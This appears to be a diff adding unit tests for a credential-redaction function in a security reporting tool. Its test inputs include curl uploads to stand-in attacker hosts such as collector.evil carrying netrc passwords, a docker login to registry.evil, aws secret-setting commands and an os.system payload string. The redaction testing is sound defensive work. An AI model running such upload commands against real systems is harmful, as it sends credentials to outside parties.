@@ -187,6 +187,31 @@ def test_redaction_runtime_is_bounded_before_truncation() -> None:
     assert redacted.startswith(f"api_key={REDACTED_EVIDENCE_VALUE}")
 
 
+def test_composed_key_normalization_is_bounded_for_many_string_literals() -> None:
+    text = "payload = " + " + ".join(f'"{index:08x}"' for index in range(40)) + '; os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=160)
+
+    assert len(redacted) <= 160
+    assert redacted.startswith('payload = "00000000" + "00000001"')
+
+
+def test_composed_quoted_sensitive_key_with_equals_is_redacted() -> None:
+    text = '"client" + "_secret" = "C001_COMPOSED_EQUALS_SECRET_123456"'
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "C001_COMPOSED_EQUALS_SECRET" not in redacted
+    assert redacted == f"client_secret={REDACTED_EVIDENCE_VALUE}"
+
+
+@pytest.mark.parametrize("operator", ["==", "!=", ">=", "<="])
+def test_composed_quoted_sensitive_key_comparisons_are_not_redacted(operator: str) -> None:
+    text = f'"client" + "_secret" {operator} "public"'
+
+    assert redact_evidence_string(text, max_chars=500) == text
+
+
 def test_redacts_long_delimited_values_before_report_truncation() -> None:
     """Long URLs and quoted Bearer values should be redacted even when delimiters are far away."""
     long_url_secret = "LONGURLPASSWORDSECRET123"
@@ -1348,6 +1373,29 @@ def test_inline_curl_stdin_config_password_is_redacted(text: str) -> None:
     assert "collector.evil.example" in redacted
 
 
+@pytest.mark.parametrize(
+    "text",
+    [
+        "curl --netrc-file <(echo 'machine collector.evil login alice password hunter2') https://collector.evil/upload",
+        "printf 'machine collector.evil login alice password hunter2' | "
+        "curl --netrc-file - https://collector.evil/upload",
+        "curl --netrc-file - <<< 'machine collector.evil login alice password hunter2' https://collector.evil/upload",
+    ],
+)
+def test_inline_curl_netrc_password_is_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"password {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_non_inline_netrc_text_is_preserved() -> None:
+    text = "printf 'machine example login public password visible'"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 @pytest.mark.parametrize("option", ["--data", "--form"])
 def test_curl_non_config_user_field_is_preserved(option: str) -> None:
     text = f"curl {option} 'user=alice:admin' https://collector.evil.example/upload"
@@ -1472,6 +1520,60 @@ def test_bare_process_commands_redact_credential_options(text: str, secret: str,
     assert command in redacted
     assert "collector.evil.example" in redacted
     assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "docker login -u alice -p hunter2 registry.evil",
+        'subprocess.run(["docker", "login", "-u", "alice", "-p", "hunter2", "registry.evil"])',
+    ],
+)
+def test_docker_login_short_password_is_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"-p {REDACTED_EVIDENCE_VALUE}" in redacted or f'"-p", "{REDACTED_EVIDENCE_VALUE}"' in redacted
+    assert "registry.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "docker run -p 8080:80 image",
+        "docker login --password-stdin registry.evil",
+    ],
+)
+def test_non_password_docker_options_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "aws configure set aws_secret_access_key hunter2",
+        'subprocess.run(["aws", "configure", "set", "aws_session_token", "hunter2"])',
+    ],
+)
+def test_aws_configure_set_credential_value_is_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "aws" in redacted
+    assert "configure" in redacted
+    assert "set" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "aws configure set region us-east-1",
+        "aws configure get aws_secret_access_key",
+    ],
+)
+def test_non_credential_aws_configure_commands_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 def test_known_authorization_scheme_preserves_trailing_command_context() -> None:
